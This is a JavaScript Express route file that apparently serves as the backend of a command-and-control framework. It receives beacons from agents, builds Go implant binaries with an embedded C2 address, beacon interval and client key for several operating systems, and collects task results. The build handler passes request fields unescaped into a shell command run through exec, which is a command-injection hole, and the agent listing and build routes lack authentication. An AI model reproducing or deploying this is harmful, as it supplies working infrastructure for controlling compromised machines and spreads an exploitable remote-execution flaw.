// Agent Routes
const express = require('express');
const router = express.Router();
const AgentService = require('../services/agentService');
const { config } = require('../config/env');
const { exec } = require('child_process');
const { promisify } = require('util');
const fs = require('fs').promises;
const path = require('path');

const execPromise = promisify(exec);

// List all agents (public)
router.get('/', (req, res) => {
  const agents = AgentService.getAllAgents();
  res.json(agents);
});

// Agent beacon (mTLS authenticated)
router.post('/beacon', (req, res) => {
  try {
    const agentData = req.body;
    const clientCert = req.headers['x-forwarded-tls-client-cert'];
    
    if (!clientCert) {
      return res.status(401).json({ error: 'Client certificate required' });
    }
    
    const agent = AgentService.handleBeacon(agentData, clientCert);
    
    console.log(`[BEACON] Agent ${agent.id} (${agent.hostname}) checked in`);
    
    res.json({
      status: 'ok',
      agentId: agent.id,
      message: 'Beacon received'
    });
  } catch (err) {
    console.error('Beacon error:', err);
    res.status(500).json({ error: 'Beacon processing failed' });
  }
});

// Whoami endpoint (agent identification)
router.post('/whoami', (req, res) => {
  const token = req.headers['x-agent-token'];
  
  if (token !== config.agentWhoamiToken) {
    return res.status(403).json({ error: 'Invalid agent token' });
  }
  
  const agentData = req.body;
  const agent = AgentService.handleBeacon(agentData, '');
  
  res.json({
    agentId: agent.id,
    message: 'Agent registered'
  });
});

// Build custom agent endpoint
router.post('/build-custom', async (req, res) => {
  console.log('[BUILD-CUSTOM] Handler called with body:', req.body);
  
  try {
    // Map frontend parameters
    const os = req.body.targetOS;
    const arch = req.body.targetArch;
    const c2Server = req.body.c2Server;
    const beaconInterval = req.body.beaconInterval;
    
    if (!os || !arch) {
      return res.status(400).json({ error: 'os and arch required' });
    }
    
    const agentDir = '/agents-go';
    const certDir = '/app/certs';
    
    // Read certificate files
    const caCert = await fs.readFile(path.join(certDir, 'ca.crt'), 'utf8');
    const clientCert = await fs.readFile(path.join(certDir, 'agent-client.crt'), 'utf8');
    const clientKey = await fs.readFile(path.join(certDir, 'agent-client.key'), 'utf8');
    
    const buildOS = os === 'windows' ? 'windows' : os === 'darwin' ? 'darwin' : 'linux';
    const buildArch = arch === 'amd64' ? 'amd64' : arch === 'arm64' ? 'arm64' : '386';
    const ext = os === 'windows' ? '.exe' : '';
    const outputName = `agent-${buildOS}-${buildArch}${ext}`;
    
    // Build to /tmp (writable), then move to /app/builds (persistent)
    const buildsDir = '/app/builds';
    await fs.mkdir(buildsDir, { recursive: true });
    
    const tempOutput = `/tmp/${outputName}`;
    const finalPath = path.join(buildsDir, outputName);
    
    const ldflags = [
      `-X 'main.BeaconInterval=${beaconInterval || '30s'}'`,
      `-X 'main.C2Server=${c2Server || `c2.${config.domain}:4443`}'`,
      `-X 'main.EmbeddedCACert=${caCert.replace(/\n/g, '\\n')}'`,
      `-X 'main.EmbeddedCert=${clientCert.replace(/\n/g, '\\n')}'`,
      `-X 'main.EmbeddedKey=${clientKey.replace(/\n/g, '\\n')}'`
    ].join(' ');
    
    // Build using absolute paths, CGO_ENABLED=0, and cwd option (like the old working implementation)
    const buildCmd = `CGO_ENABLED=0 GOOS=${buildOS} GOARCH=${buildArch} go build -ldflags "${ldflags}" -o ${tempOutput} ${agentDir}/cmd/agent/main.go`;
    
    console.log('[BUILD] Building agent:', { os: buildOS, arch: buildArch });
    console.log('[BUILD] Command length:', buildCmd.length);
    console.log('[BUILD] Starting build process...');
    
    const { stdout, stderr } = await execPromise(buildCmd, { 
      cwd: agentDir,
      maxBuffer: 1024 * 1024 * 10,
      timeout: 120000 // 2 minute timeout
    });
    
    console.log('[BUILD] Build process completed');
    console.log('[BUILD] stdout:', stdout ? stdout.substring(0, 500) : '(empty)');
    console.log('[BUILD] stderr:', stderr ? stderr.substring(0, 500) : '(empty)');
    
    if (stderr && !stderr.includes('warning')) {
      console.log('[BUILD] Build failed with stderr');
      throw new Error(stderr);
    }
    
    // Move from /tmp to /app/builds
    console.log('[BUILD] Moving binary from', tempOutput, 'to', finalPath);
    await fs.rename(tempOutput, finalPath);
    
    console.log('[BUILD] Getting file stats...');
    const stats = await fs.stat(finalPath);
    
    console.log('[BUILD] Success! Binary size:', stats.size, 'bytes');
    
    res.json({
      success: true,
      filename: outputName,
      size: stats.size,
      downloadPath: `/api/agents/download/${outputName}`,
      agentId: req.body.agentId,
      tasks: req.body.tasks.length,
      beaconInterval: beaconInterval || '30s',
      c2Server: c2Server || `c2.${config.domain}:4443`,
      targetOS: buildOS,
      targetArch: buildArch,
      expiresAt: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
      message: 'Agent built successfully'
    });
  } catch (err) {
    console.error('[BUILD] ERROR:', err.message);
    console.error('[BUILD] Stack:', err.stack);
    res.status(500).json({ error: err.message || 'Build failed' });
  }
});

// Receive embedded task results from agents
router.post('/:agentId/embedded-tasks', (req, res) => {
  const { agentId } = req.params;
  const { results } = req.body;
  
  if (!results || !Array.isArray(results)) {
    return res.status(400).json({ error: 'Missing results array' });
  }
  
  console.log(`[EmbeddedTasks] Received ${results.length} task results from agent: ${agentId}`);
  
  const TaskModel = require('../models/Task');
  let storedCount = 0;
  
  for (const result of results) {
    try {
      // Store as a completed task
      const task = {
        id: result.taskId || `embedded-${Date.now()}-${Math.random().toString(36).slice(2, 9)}`,
        agentId,
        cmd: result.type || 'embedded',
        args: result.args || [],
        status: result.status || 'completed',
        result: result.output || result.result || '',
        error: result.error || '',
        createdAt: new Date().toISOString(),
        completedAt: new Date().toISOString()
      };
      
      // Add to task queue
      const tasks = TaskModel.tasks.get(agentId) || [];
      tasks.push(task);
      TaskModel.tasks.set(agentId, tasks);
      
      storedCount++;
      console.log(`[EmbeddedTasks] Stored result for task ${task.id} (${result.type}): ${task.status}`);
    } catch (err) {
      console.error(`[EmbeddedTasks] Failed to store task result:`, err);
    }
  }
  
  res.json({ success: true, stored: storedCount });
});

module.exports = router;
